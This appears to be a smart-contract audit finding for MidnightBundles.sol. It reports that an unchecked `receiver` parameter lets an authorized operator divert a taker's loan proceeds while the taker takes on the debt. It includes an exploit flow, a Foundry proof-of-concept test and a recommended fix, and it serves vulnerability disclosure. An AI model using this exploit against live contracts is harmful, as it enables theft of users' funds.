### Title
Authorized operator can redirect taker's loan proceeds to arbitrary address via unchecked `receiver` parameter - (File: src/periphery/MidnightBundles.sol)

### Summary
In `supplyCollateralAndSellWithUnitsTarget`, the `receiver` parameter that controls where loan proceeds are sent is never validated against `taker`. An authorized operator who passes the `isAuthorized` check can set `receiver` to themselves, causing the taker to bear new debt while the operator receives all loan proceeds. The same flaw exists in `supplyCollateralAndSellWithAssetsTarget`.

### Finding Description
**Code path:**

The authorization check at line 127 only verifies the caller may act on behalf of `taker`: [1](#0-0) 

The `take` loop at lines 152–160 executes with `taker` as the seller and `address(this)` (the bundler) as `receiverIfTakerIsSeller`, so all `filledSellerAssets` land in the bundler: [2](#0-1) 

The final transfer at line 168 sends those proceeds to the caller-supplied `receiver` with no check that `receiver == taker` or is taker-designated: [3](#0-2) 

**Attacker inputs:**
- `taker` = victim address
- `receiver` = `attacker` (msg.sender)
- `collateralSupplies` = `[]` (taker already has sufficient collateral in Midnight)
- `takes` = array of live buy offers

**Exploit flow:**
1. Attacker obtains `isAuthorized(taker, attacker) == true` (a legitimate authorization the taker granted for some other purpose, or a social-engineering step).
2. Attacker calls `supplyCollateralAndSellWithUnitsTarget(targetUnits, 0, taker, attacker, [], takes, 0, address(0))`.
3. Line 127 passes — attacker is authorized.
4. The `take` loop fills buy offers with `taker` as seller; `taker`'s debt increases by `targetUnits`; bundler receives `filledSellerAssets`.
5. Line 168 transfers `filledSellerAssets` to `attacker`.

**Why existing checks fail:**
- The `isAuthorized` check (line 127) only gates whether the caller may invoke the function on behalf of `taker`; it says nothing about where proceeds go.
- The `minSellerAssets` slippage check (line 166) only enforces a floor on the amount sent to `receiver`, not the identity of `receiver`.
- There is no `require(receiver == taker || IMidnight(MIDNIGHT).isAuthorized(taker, receiver))` anywhere.

The identical missing check exists in `supplyCollateralAndSellWithAssetsTarget`: [4](#0-3) [5](#0-4) 

### Impact Explanation
A taker who has authorized any operator (e.g., a DeFi integration, a relayer, or a compromised key) for any purpose can have their entire loan proceeds stolen in a single transaction. The taker ends up with new debt and zero loan tokens; the attacker receives all `filledSellerAssets`. This is a direct, complete loss of loan proceeds with no recovery path.

### Likelihood Explanation
Preconditions: (1) attacker holds `isAuthorized(taker, attacker) == true` — a common state for any user who has authorized a third-party operator or integration; (2) taker has collateral deposited in Midnight; (3) live buy offers exist in the market. All three are routine protocol states. The attack is atomic, repeatable, and requires no special on-chain conditions beyond the authorization.

### Recommendation
Add a check that `receiver` is either `taker` itself or an address that `taker` has explicitly authorized on Midnight:

```solidity
require(
    receiver == taker || IMidnight(MIDNIGHT).isAuthorized(taker, receiver),
    Unauthorized()
);
```

Apply the same fix to `supplyCollateralAndSellWithAssetsTarget` at the same position before the final transfer.

### Proof of Concept
```solidity
function testOperatorDivertsLoanProceeds() public {
    address taker   = makeAddr("taker");
    address attacker = makeAddr("attacker");

    // 1. Taker authorizes attacker as operator on Midnight
    vm.prank(taker);
    midnight.setIsAuthorized(attacker, true, taker);

    // 2. Taker has sufficient collateral already deposited
    collateralize(market, taker, 100e18);

    // 3. Live buy offer exists
    offers[0].maxUnits = 100e18;
    Take[] memory takes = new Take[](1);
    takes[0] = Take({offer: offers[0], units: 100e18, ratifierData: hex""});

    uint256 attackerBalanceBefore = loanToken.balanceOf(attacker);
    uint256 takerDebtBefore = midnight.debtOf(id, taker);

    // 4. Attacker calls with receiver = attacker
    vm.prank(attacker);
    midnightBundles.supplyCollateralAndSellWithUnitsTarget(
        100e18,
        0,
        taker,
        attacker,          // receiver = attacker
        new CollateralSupply[](0),
        takes,
        0,
        address(0)
    );

    // 5. Assert: taker bears new debt, attacker received all proceeds
    assertGt(midnight.debtOf(id, taker), takerDebtBefore, "taker has new debt");
    assertGt(loanToken.balanceOf(attacker), attackerBalanceBefore, "attacker received proceeds");
    assertEq(loanToken.balanceOf(taker), 0, "taker received nothing");
}
```

### Citations

**File:** src/periphery/MidnightBundles.sol (L127-127)
```text
        require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
```

**File:** src/periphery/MidnightBundles.sol (L152-160)
```text
            try IMidnight(MIDNIGHT)
                .take(
                    takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(this), address(0), ""
                ) returns (
                uint256, uint256 resSellerAssets
            ) {
                filledUnits += unitsToTake;
                filledSellerAssets += resSellerAssets;
            } catch {}
```

**File:** src/periphery/MidnightBundles.sol (L165-168)
```text
        uint256 referralFeeAssets = filledSellerAssets.mulDivDown(referralFeePct, WAD);
        require(filledSellerAssets - referralFeeAssets >= minSellerAssets, SellerAssetsTooLow());
        if (referralFeeAssets > 0) SafeTransferLib.safeTransfer(loanToken, referralFeeRecipient, referralFeeAssets);
        SafeTransferLib.safeTransfer(loanToken, receiver, filledSellerAssets - referralFeeAssets);
```

**File:** src/periphery/MidnightBundles.sol (L262-262)
```text
        require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
```

**File:** src/periphery/MidnightBundles.sol (L306-307)
```text
        if (referralFeeAssets > 0) SafeTransferLib.safeTransfer(loanToken, referralFeeRecipient, referralFeeAssets);
        SafeTransferLib.safeTransfer(loanToken, receiver, targetSellerAssets);
```
